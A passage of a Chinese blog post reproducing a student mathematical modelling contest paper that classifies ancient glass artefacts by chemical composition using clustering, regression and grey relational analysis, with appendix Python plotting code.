id="5-2-4合理性和敏感性检验"><a href="#5-2-4合理性和敏感性检验" class="headerlink" title="5.2.4合理性和敏感性检验"></a>5.2.4合理性和敏感性检验</h5><p>本文使用轮廓系数进行合理性检验，遍历簇数，计算对应轮廓系数，选择轮廓系数最大时对应的聚类模型。</p><p>单一轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps49.jpg" style="zoom:100%;" /> </center>其中a(i)表示i所属簇内其他样本的平均距离，b(i)表示i与其他簇的样本平均距离的最小值[3]。<p>聚类总体轮廓系数：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps50.jpg" style="zoom:100%;" /> </center>总轮廓系数S越接近1说明聚类越合理。<p>敏感性分析上，将具有典型化学成分含量特征的样本加入数据集，再次进行聚类分析，观测聚类结果是否与预料当中相同。本文中将问题一中预测的风化前的数据加入到高钾风化前、铅钡风化前的表单中进行聚类分析。分析是否与预期一致。</p><h4 id="5-3问题三的求解与分析"><a href="#5-3问题三的求解与分析" class="headerlink" title="5.3问题三的求解与分析"></a>5.3问题三的求解与分析</h4><h5 id="5-3-1鉴别未知类别玻璃文物所属类型"><a href="#5-3-1鉴别未知类别玻璃文物所属类型" class="headerlink" title="5.3.1鉴别未知类别玻璃文物所属类型"></a>5.3.1鉴别未知类别玻璃文物所属类型</h5><p>观察表单3所给出的未知类别玻璃文物数据发现，每条数据分为文物编号、表面风化和化学成分3个变量，我们判别玻璃文物类型前可以先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，然后再次对表单2的数据规律按照风化和无风化进行总结，找到合适作为自变量的化学成分，通过给予的未知类别玻璃文物数据和后期回归方程模型的建立计算出的预测结果，根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃。最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p><strong>Step1</strong> 表单2数据规律分析</p><p>在建立多元回归方程模型的时候发现，14个化学成分的比例分布不平衡，如果按照将显著性最大的二氧化硅作为因变量之一，来建立多元回归模型的话会导致影响因变量的自变量只有二氧化硅甚至使用的自变量皆无意义，无法将其余13个化学成分的比例价值凸显出来，进而能准确利用结果进行未知类别玻璃文物所属类型的鉴别。所以我们转而对表单2的数据间统计规律进一步深究，使用能显著代表文物类型且非二氧化硅的化学成分。</p><p>首先对于表单2的数据我们先划分为风化和无风化两个大类，在其中又分四小类分别是无风化高钾玻璃、无风化铅钡玻璃、无风化铅钡玻璃和风化铅钡玻璃。通过Python软件的matplotlib库画出箱图展现每一个小类中一维变量的统计规律。如下图5-16所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps51.png" style="zoom:100%;" /> </center><center>图5-16未风化高钾玻璃的箱图</center>箱图最大有点不受异常值的影响，它可以用一种相对稳定的方式描述数据的离散分布情况。箱图共有七大组成部分：上线、上四分位数、中位数、下四分位数、下线、四分位距离以及异常值。<p>之后根据箱图展现的统计规律和散点图展现的分布情况，进行以鉴别玻璃类型为目的数据整理，如下表5-12所示。</p><center>表5-12数据规律统计表（部分）</center>| 表面风化 |   类型    |      氧化钠       |        氧化钾         |      氧化钙       |                         |          氧化铝          || :------: | :-------: | :---------------: | :-------------------: | :---------------: | :---------------------: | :----------------------: ||   风化   | 高钾玻璃  |        无         |       0.59~1.01       | 0.21~1.07Max:1.66 |        0.54~0.64        |         0.81~3.5         || 铅钡玻璃 | 0.8~2.22  |     0.14~0.4      | 0.37~3.58Max:5.18,6.4 |     0.47~1.54     |   0.45~5.73Max:13.65    |                          ||  无风化  | 高钾玻璃  |     2.1~3.38      |      5.19~14.52       | 5.41~8.7Min:2.01  |        0.52~1.98        | 3.05~6.19Max:10.05,11.15 || 铅钡玻璃 | 0.92~3.38 | 0.11~0.35Max:0.71 |       0.38~2.98       |     0.51~1.67     | 1.44~6.5Max:14.34,12.69 |                          |<p>通过表5-12可知，高钾玻璃和铅钡玻璃的部分相同化学成分的变化范围是不相交的且存在明显的差异，我们可以在使用模型前直接判断出它的类型。同时可以将数据分类：第一类数据变化范围大，数值大可以考虑作为因变量，如未风化高钾的氧化铅和氧化钡；第二类数据整体波动适中，只出现几个较大值或较小值，可以考虑作为因变量或自变量，如氧化铜、氧化铁和氧化铝；第三类数据波动小且整体数值也小，还具有可以判别文物类型的特点，一般将其作为自变量，计算出的结果可以尽可能在表5-x的范围内，如未风化高钾的氧化锶。</p><p><strong>Step1</strong> 2多元回归模型求取文物所属类别</p><p>多元回归模型基本形式为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps52.jpg" style="zoom:100%;" /> </center>其中，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps133.jpg)为各项系数，![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps134.jpg)为误差值。<p>在无风化高钾玻璃类别中，我们使用SPASS软件进行多次计算，获得如下回归模型分析表5-13。</p><p>因变量：氧化钙</p><p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-13 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps139.jpg) | 0.844 | 0.713 | 0.659     | 1.556     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-2.103</td><td>-3.145</td><td>0.006</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps140.jpg" alt="img"></td><td>0.121</td><td>5.195</td><td>0.000</td><td>1.300</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps141.jpg" alt="img"></td><td>-0.036</td><td>-1.048</td><td>0.310</td><td>1.218</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps142.jpg" alt="img"></td><td>0.261</td><td>4.987</td><td>0.000</td><td>1.275</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps53.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps54.jpg" style="zoom:80%;" /></center><center>   图5-17 氧化钙直方图           图5-18 正态P-P图</center>因变量：氧化铜<p>预测变量：（常量），氧化铝，氧化钡，氧化铅</p><center>表5-14 回归方程分析表</center>|                                                              | R     | R方   | 调整后R方 | 德宾-沃森 | 显著性 || ------------------------------------------------------------ | ----- | ----- | --------- | --------- | ------ || ![img](file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps148.jpg) | 0.904 | 0.818 | 0.785     | 1.260     | 0.000  |<table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>（常数）</td><td>-1.782</td><td>-1.613</td><td>0.125</td><td></td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps149.jpg" alt="img"></td><td>0.024</td><td>0.596</td><td>0.559</td><td>1.404</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps150.jpg" alt="img"></td><td>0.303</td><td>8.550</td><td>0.000</td><td>1.061</td></tr><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps151.jpg" alt="img"></td><td>0.039</td><td>0.539</td><td>0.678</td><td>1.475</td></tr></tbody></table><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps55.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps56.jpg" style="zoom:80%;" /></center><center>图5-19 氧化铜直方图  图5-20 氧化钙正态P-P图</center>因变量：氧化钠<p>预测变量：（常量），氧化铝<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps154.jpg" alt="img">，氧化钡<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps155.jpg" alt="img">，氧化铅<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps156.jpg" alt="img">，氧化铜<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps157.jpg" alt="img"></p><p>表5-15 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps158.jpg" alt="img"></td><td>0.904</td><td>0.818</td><td>0.785</td><td>1.260</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>1.504</td><td>.241</td><td>.891</td><td></td></tr><tr><td>氧化铅</td><td>-.047</td><td>-.401</td><td>.705</td><td>5.436</td></tr><tr><td>氧化钡</td><td>.249</td><td>.779</td><td>.471</td><td>6.629</td></tr><tr><td>氧化铜</td><td>1.191</td><td>2.652</td><td>.045</td><td>1.476</td></tr><tr><td>氧化铝</td><td>-.059</td><td>-.208</td><td>.843</td><td>11.614</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps159.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps160.jpg" alt="img"> </p><p>​            图5-20 氧化钠直方图                             图5-21 氧化钠正态P-P图</p><p>因变量：氧化钡            预测变量：（常量），氧化铜</p><p>表5-16 回归方程分析表</p><table><thead><tr><th></th><th>R</th><th>R方</th><th>调整后R方</th><th>德宾-沃森</th><th>显著性</th></tr></thead><tbody><tr><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps162.jpg" alt="img"></td><td>0.902</td><td>0.813</td><td>0.803</td><td>1.118</td><td>0.000</td></tr></tbody></table><table><thead><tr><th>预测变量</th><th>B</th><th>t</th><th>显著性</th><th>VIF</th></tr></thead><tbody><tr><td>常数</td><td>4.658</td><td>6.213</td><td>0.000</td><td></td></tr><tr><td>氧化铜</td><td>2.718</td><td>9.091</td><td>0.000</td><td>1.000</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps163.jpg" alt="img"><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps164.jpg" alt="img"> </p><p>​         图5-22 氧化钡直方图                            图 5-23 氧化钡 P-P图</p><p>以上分析可知，所有的显著性都满足小于0.05的条件，故多元回归方程可行。在无风化条件下，如果以上化学成分不满足高钾玻璃的情况，那么将其归类为铅钡玻璃。在风化条件下，我们发现可以看高钾玻璃的成分情况与数据规律统计表对比，如果不符合高钾玻璃则为铅钡玻璃。</p><p>将表单3数据输入，首先将数据分类为风化和未风化。分析风化数据我们首先依据数据规律统计表，如果符合就符合个数加1，通过对符合高钾和铅钡玻璃的条件的个数进行判断该未知文物类型。最终判断结果如表5-17所示。</p><p>表5-17 玻璃文物分类表</p><table><thead><tr><th></th><th>高钾玻璃</th><th>铅钡玻璃</th></tr></thead><tbody><tr><td>A2</td><td>6</td><td>2</td></tr><tr><td>A5</td><td>1</td><td>6</td></tr><tr><td>A6</td><td>8</td><td>0</td></tr><tr><td>A7</td><td>7</td><td>0</td></tr></tbody></table><p>但A2表数据缺失较多，但是含有类型特征较强的氧化铝，氧化铅，五氧化二磷3种化学成分，形成新的比例：高钾玻璃：铅钡玻璃=1：2，所以A2更可能是铅钡玻璃。</p><p>分析未风化数据，我们首先利用回归方程进行计算得：</p><table><thead><tr><th></th><th>氧化钠</th><th>氧化钙</th><th>氧化铜</th><th>氧化钡</th></tr></thead><tbody><tr><td>A1</td><td>3.59044</td><td>-0.21597</td><td>-1.50003</td><td>10.39298</td></tr><tr><td>A3</td><td>-0.27902</td><td>3.28207</td><td>0.70326</td><td>5.22878</td></tr><tr><td>A6</td><td>1.08907</td><td>2.38099</td><td>1.59438</td><td>7.26728</td></tr><tr><td>A7</td><td>11.11155</td><td>0.61212</td><td>2.24646</td><td>29.14718</td></tr></tbody></table><p>综上，高钾玻璃分别是A1,A4,A6,A7,铅钡玻璃分别是A2,A3,A5,A8</p><h4 id="5-4问题四的求解与分析"><a href="#5-4问题四的求解与分析" class="headerlink" title="5.4问题四的求解与分析"></a>5.4问题四的求解与分析</h4><p>我们可以使用灰色关联分析的方式对比较不同类别之间的化学成分关联关系的差异性</p><h5 id="5-4-1-数据无量纲化处理"><a href="#5-4-1-数据无量纲化处理" class="headerlink" title="5.4.1 数据无量纲化处理"></a>5.4.1 数据无量纲化处理</h5><p>将题目给出表单2中，原始分类中的未经过风化的高钾玻璃与铅钡玻璃的数据分别导入SPSS，并通过Z-score标准化法对其中各项数据进行无量纲化。</p><p>Z-score标准化法公式如下：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps165.jpg" alt="img"> </p><p>Z-score标准化法,首先计算该指标的均值<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps166.jpg" alt="img">和标准差，然后用该变量的每一个观察值x减去均值x，再除以其标准差。</p><p>数据经过Z-score标准化后，将符合标准正态分布（0-1），即将有约一半观察值的数值小于0，另一半观察值的数值大于0，变量的均值为0，标准差为1，在本题的求解过程中，数据的标准化通过SPSS软件对数据分析获取[4]。</p><h5 id="5-4-2-灰色关联分析不同类别之间的化学成分关联关系"><a href="#5-4-2-灰色关联分析不同类别之间的化学成分关联关系" class="headerlink" title="5.4.2 灰色关联分析不同类别之间的化学成分关联关系"></a>5.4.2 灰色关联分析不同类别之间的化学成分关联关系</h5><p>将数据转置生成如下矩阵：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps167.jpg" alt="img"> </p><p>其中参数m是变量类型，结合表单2可知，在当前数据集下m=14</p><p>关联程度实质是参考数列与比较数列曲线形状的相似程度。凡比较数列与参考数列的曲线形状接近，则两者间的关联度较大；反之，如果曲线形状相差较大，则两者间的关联度较小。因此，可用曲线间的差值大小作为关联度的衡量标准。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps168.jpg" alt="img"> </p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps169.jpg" alt="img"> </p><p>其中ρ为分辨系数,用于降低Δ(max)过大而使关联系数出现较大误差，其取值范围(0,1)。当ρ越小，关联系数间差异越大，区分能力越强。在实现过程中ρ取值为0.5.</p><p>在本题的求解过程中，通过Matlab编程实现计算每个被评价对象指标序列，参考序列对应元素的绝对差值，并最终求出关联系数，并对其进行排序。（实现代码见附录）</p><h5 id="5-4-3-差异性分析"><a href="#5-4-3-差异性分析" class="headerlink" title="5.4.3 差异性分析"></a>5.4.3 差异性分析</h5><p>最后对关联度进行排序，得到相应类型下的关联度顺序。</p><p>其中高钾玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">19.0240</span> <span class="token number">18.1279</span> <span class="token number">18.2748</span> <span class="token number">19.2907</span> <span class="token number">20.5374</span> <span class="token number">19.9724</span> <span class="token number">18.3470</span> <span class="token number">18.1501</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span> <span class="token number">18.5236</span> <span class="token number">20.0456</span> <span class="token number">21.3854</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，7，13，3，11，5，2，4，12，8，10，9，6，14</p><p>不同的是铅钡玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">21.3854</span> <span class="token number">20.5374</span> <span class="token number">20.0456</span> <span class="token number">19.9724</span> <span class="token number">19.2907</span> <span class="token number">19.0240</span> <span class="token number">18.5236</span> <span class="token number">18.3470</span> <span class="token number">18.2748</span> <span class="token number">18.1501</span> <span class="token number">18.1279</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，14，6，13，7，5，2，12，8, 4，9 ，3，10，11</p><p>比较二者关联度顺序，即可证明不同类别之间的化学成分关联具有显著差异性</p><h3 id="六、模型的评价与推广"><a href="#六、模型的评价与推广" class="headerlink" title="六、模型的评价与推广"></a>六、模型的评价与推广</h3><h4 id="6-1模型的优点"><a href="#6-1模型的优点" class="headerlink" title="6.1模型的优点"></a>6.1模型的优点</h4><p>在分析文物样品表面有无风化化学成分含量的统计规律时，将整个决策过程分为两部分，分别基于多元回归和最小二乘法进行拟合，保证了数据分析结果的可靠。</p><p>在实现系统聚类后，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。</p><p>使用灰色关联分析方式能够很好的处理部分信息未知、部分信息已知的数据。</p><h4 id="6-2-模型的缺点"><a href="#6-2-模型的缺点" class="headerlink" title="6.2 模型的缺点"></a>6.2 模型的缺点</h4><p>进行亚类划分时，系统聚类完成后又加以统计学分析，对于一些规律不很明显的组合进行人工干预重新组合，虽然有利于划分，但在客观上也导致了模型主观性成分的提高。</p><h4 id="6-3-模型的优化"><a href="#6-3-模型的优化" class="headerlink" title="6.3 模型的优化"></a>6.3 模型的优化</h4><p>题目附件中数据量较少，随着建模过程的不断深入及划分亚类之后，每种亚类之间的数据量也过少，划分有较大误差。可以通过获取更大数据集对模型进行优化。</p><h3 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h3><p>[1] 李青会,干福熹 .关于中国古代玻璃研究的几个问题[J]. 自然科学史研究，2007年，26卷：234-247</p><p>[2] 段浩,干福熹,赵虹霞.实验室模拟过渡金属离子掺杂的中国古代玻璃的着色现象[J]. 硅酸盐学报 2009年12期</p><p>[3] 孙林,刘梦含,徐久成.基于优化初始聚类中心和轮廓系数的K-means聚类算法[J].模糊系统与数学,2022,36(01):47-65.</p><p>[4] 孙芳芳.浅议灰色关联度分析方法及其应用[J].科技信息, 2010</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>附录说明：</p><ol><li><p>各类玻璃元素对比组成可视化python实现</p></li><li><p>高钾玻璃各组成成分的拟合曲线python实现代码</p></li><li><p>对高钾玻璃、铅钡玻璃进行亚分类的划分结果</p></li><li><p>灰色关联分析Matlab代码实现</p></li><li><p>表单2数据规律统计表</p></li></ol><h4 id="附录1-各类玻璃元素对比组成可视化python实现"><a href="#附录1-各类玻璃元素对比组成可视化python实现" class="headerlink" title="附录1  各类玻璃元素对比组成可视化python实现"></a>附录1  各类玻璃元素对比组成可视化python实现</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"二氧化硅"</span><span class="token punctuation">,</span><span class="token string">"氧化钠"</span><span class="token punctuation">,</span><span class="token string">"氧化钾"</span><span class="token punctuation">,</span><span class="token string">"氧化钙"</span><span class="token punctuation">,</span><span class="token string">"氧化镁"</span><span class="token punctuation">,</span><span class="token string">"氧化铝"</span><span class="token punctuation">,</span><span class="token string">"氧化铁"</span><span class="token punctuation">,</span><span class="token string">"氧化铜"</span><span class="token punctuation">,</span><span class="token string">"氧化铅"</span><span class="token punctuation">,</span><span class="token string">"氧化钡"</span><span class="token punctuation">,</span><span class="token string">"五氧化二磷"</span><span class="token punctuation">,</span><span class="token string">"氧化锶"</span><span class="token punctuation">,</span><span class="token string">"氧化锡"</span><span class="token punctuation">,</span><span class="token string">"二氧化硫"</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">68.71125</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9.031428571</span><span class="token punctuation">,</span><span class="token number">5.541428571</span><span class="token punctuation">,</span><span class="token number">1.462857143</span><span class="token punctuation">,</span><span class="token number">6.8525</span><span class="token punctuation">,</span><span class="token number">2.768571429</span><span class="token punctuation">,</span><span class="token number">2.895</span><span class="token punctuation">,</span><span class="token number">0.642</span><span class="token punctuation">,</span><span class="token number">1.795</span><span class="token punctuation">,</span><span class="token number">1.75</span><span class="token punctuation">,</span><span class="token number">0.0975</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.406666667</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">94.286</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">0.712</span><span class="token punctuation">,</span><span class="token number">0.54</span><span class="token punctuation">,</span><span class="token number">1.616</span><span class="token punctuation">,</span><span class="token number">0.248</span><span class="token punctuation">,</span><span class="token number">1.764</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.3675</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.095</span><span class="token punctuation">,</span><span class="token number">2.48</span><span class="token punctuation">,</span><span class="token number">13.525</span><span class="token punctuation">,</span><span class="token number">8.485</span><span class="token punctuation">,</span><span class="token number">0.52</span><span class="token punctuation">,</span><span class="token number">6.17</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">2.9</span><span class="token punctuation">,</span><span class="token number">0.11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.27</span><span class="token punctuation">,</span><span class="token number">0.04</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.47</span><span class="token punctuation">,</span><span class="token number">3.38</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">,</span><span class="token number">8.23</span><span class="token punctuation">,</span><span class="token number">0.66</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">,</span><span class="token number">1.62</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.16</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>x<span class="token punctuation">,</span> str1<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y3<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y4<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录2-高钾玻璃各组成成分的拟合曲线python实现代码"><a href="#附录2-高钾玻璃各组成成分的拟合曲线python实现代码" class="headerlink" title="附录2 高钾玻璃各组成成分的拟合曲线python实现代码"></a>附录2 高钾玻璃各组成成分的拟合曲线python实现代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LinearRegressionplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment">#实例化线性模型****</span>lr <span class="token operator">=</span> LinearRegression<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">69.33</span><span class="token punctuation">,</span><span class="token number">87.05</span><span class="token punctuation">,</span><span class="token number">61.71</span><span class="token punctuation">,</span><span class="token number">65.88</span><span class="token punctuation">,</span><span class="token number">61.58</span><span class="token punctuation">,</span><span class="token number">67.65</span><span class="token punctuation">,</span><span class="token number">59.81</span><span class="token punctuation">,</span><span class="token number">92.63</span><span class="token punctuation">,</span><span class="token number">95.02</span><span class="token punctuation">,</span><span class="token number">96.77</span><span class="token punctuation">,</span><span class="token number">94.29</span><span class="token punctuation">,</span><span class="token number">92.35</span><span class="token punctuation">,</span><span class="token number">92.72</span><span class="token punctuation">,</span><span class="token number">59.01</span><span class="token punctuation">,</span><span class="token number">65.18</span><span class="token punctuation">,</span><span class="token number">62.47</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">9.99</span><span class="token punctuation">,</span><span class="token number">5.19</span><span class="token punctuation">,</span><span class="token number">12.37</span><span class="token punctuation">,</span><span class="token number">9.67</span><span class="token punctuation">,</span><span class="token number">10.95</span><span class="token punctuation">,</span><span class="token number">7.37</span><span class="token punctuation">,</span><span class="token number">7.68</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.59</span><span class="token punctuation">,</span><span class="token number">0.92</span><span class="token punctuation">,</span><span class="token number">1.01</span><span class="token punctuation">,</span><span class="token number">0.74</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12.53</span><span class="token punctuation">,</span><span class="token number">14.52</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.93</span><span class="token punctuation">,</span><span class="token number">4.06</span><span class="token punctuation">,</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token number">6.44</span><span class="token punctuation">,</span><span class="token number">7.5</span><span class="token punctuation">,</span><span class="token number">11.15</span><span class="token punctuation">,</span><span class="token number">10.05</span><span class="token punctuation">,</span><span class="token number">1.98</span><span class="token punctuation">,</span><span class="token number">1.32</span><span class="token punctuation">,</span><span class="token number">0.81</span><span class="token punctuation">,</span><span class="token number">1.46</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">6.16</span><span class="token punctuation">,</span><span class="token number">6.18</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.87</span><span class="token punctuation">,</span><span class="token number">0.78</span><span class="token punctuation">,</span><span class="token number">5.09</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">3.27</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">1.56</span><span class="token punctuation">,</span><span class="token number">1.55</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">0.55</span><span class="token punctuation">,</span><span class="token number">1.54</span><span class="token punctuation">,</span><span class="token number">4.73</span><span class="token punctuation">,</span><span class="token number">1.07</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'二氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'氧化铜含量'</span><span class="token 